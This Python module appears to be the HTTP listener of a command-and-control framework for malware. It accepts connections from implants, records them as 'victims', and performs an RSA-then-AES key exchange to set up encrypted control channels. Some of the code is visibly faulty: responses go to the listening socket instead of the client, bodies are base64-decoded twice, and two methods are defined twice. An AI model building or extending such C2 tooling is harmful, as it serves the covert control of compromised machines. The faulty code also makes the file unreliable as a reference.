import socket
import hashlib
import base64
import struct
import threading

from lib.ColorPrint import ColorPrint as cp
from lib.C2P import C2P
from lib.Client import Client
from lib.ColorPrint import ColorPrint as cp
from lib.EZCrypto import PAES, EZRSA, Encoder, PRSA
from lib.Listener import Listener as mainListener
from lib.tool import EZData, EZClass
from lib.EZPayload import get_payload

class Listener:
    def __init__(self, ip: str, port: int, main_listener: mainListener):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP

        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.main_listener = main_listener
        
        ip = '0.0.0.0' if ip == '*' else ip

        sock.bind((ip, port))

        self.sock = sock
        self.bListen = sock.fileno() != -1

        self.msg_handler = None

        self.dic_victim = {}

    def get_victims(self) -> dict:
        return self.dic_victim
    
    def set_msg_handler(self, method: object):
        self.msg_handler = method

    def start(self):
        self.sock.listen(10000)

        while True:
            clnt_victim, clnt_addr = self.sock.accept()

            t = threading.Thread(target=self.handler, args=[clnt_victim, clnt_addr, ])
            t.daemon = True

            t.start()

            cp.pf_info(f'New client: {clnt_addr}')

    def send_http_resp(self, szData: str):
        self.sock.sendall(szData.encode())

    def handler(self, clnt_sock: socket.socket, clnt_addr: tuple):

        clnt = Client(clnt_sock)

        while clnt_sock.fileno() != -1:
            try:
                req = clnt_sock.recv(65536).decode('utf-8')
                print(req)
                headers, body = req.split('\r\n\r\n', 1)

                aHeader = headers.split('\r\n')
                nContentLength = 0

                for szHeaderLine in aHeader:
                    if szHeaderLine.lower().startswith('content-length:'):
                        nContentLength = int(szHeaderLine.split(':')[1].strip())
                        break

                while len(body) < nContentLength:
                    body += clnt_sock.recv(nContentLength - len(body)).decode('utf-8')

                if not body:
                    continue

                body = Encoder.b64d2str(body)
                
                # Handler data

                szMethod = aHeader[0].split(' ')[0]
                szResource = aHeader[0].split(' ')[1]

                if szMethod == 'GET':
                    if szResource == '/0':
                        if not clnt.xml_rsa_pubKey and not clnt.xml_rsa_privKey:
                            cp.pf_ok('Generating RSA key pair.', clnt.addr)

                            n_rsa_keysize = 4096
                            n, e, d, p, q = EZRSA(n_rsa_keysize).generate_rsa_keypair(n_rsa_keysize)
                            xml_PubKey = EZRSA(n_rsa_keysize).encode_public_key(n, e)
                            xml_PrivKey = EZRSA(n_rsa_keysize).encode_private_key(n, e, d, p, q)

                            cp.pf_ok('RSA key pair is generated.', clnt.addr)

                            clnt.xml_rsa_pubKey = xml_PubKey
                            clnt.xml_rsa_privKey = xml_PrivKey

                            szBody = self.get_httpResponse_body(xml_PubKey)
                            self.send_http_resp(szBody)
                        elif not clnt.pAES:
                            split = Encoder.b64d2str(body).split('|')

                            sz_b64_enc_iv = split[0]
                            sz_b64_enc_key = split[1]

                            ab_enc_iv = Encoder.b64str2bytes(sz_b64_enc_iv)
                            ab_enc_key = Encoder.b64str2bytes(sz_b64_enc_key)

                            priv_key = PRSA.xml_to_rsa_key(clnt.xml_rsa_privKey)

                            ab_iv = PRSA.rsa_decrypt(ab_enc_iv, priv_key)
                            ab_key = PRSA.rsa_decrypt(ab_enc_key, priv_key)

                            clnt.set_aes(PAES(ab_iv, ab_key))

                            cp.pf_ok('RSA decrypt successfully, the server obtain AES iv and key.', clnt_addr)

                            cp.pf_info('Do challenge and response for verification')



                elif szMethod == 'POST':
                    pass


            except Exception as ex:
                cp.pf_err(str(ex))
                clnt_sock.close()
        
    def get_httpResponse_body(self, szMessage: str) -> str:
        szMessage = Encoder.stre2b64(szMessage)
        nBodySize = len(szMessage)
        szRespHeader = (
            f'HTTP/1.1 200 OK\r\n'
            f'Content-Type: text/plain\r\n'
            f'Content-Length: {nBodySize}\r\n'
            f'\r\n'
        )

        szResp = szRespHeader + szMessage

        return szResp
    
    def get_victims(self) -> dict:
        return self.dic_victim
    
    def set_msg_handler(self, method: object):
        self.msg_handler = method

if __name__ == '__main__':
    pass        